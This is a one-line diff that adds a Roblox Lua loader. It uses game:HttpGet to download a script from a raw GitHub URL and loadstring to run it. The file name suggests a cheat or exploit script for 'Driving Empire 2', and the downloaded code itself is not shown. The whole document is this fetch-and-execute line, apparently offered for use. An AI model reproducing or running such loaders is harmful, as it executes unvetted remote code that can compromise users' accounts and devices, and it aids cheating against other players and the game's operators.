@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Frontierpifurnace41/loaders/main/loaders/driving-empire-2-new-limted-spam6-o1drqyteo1xnqz.lua"))()
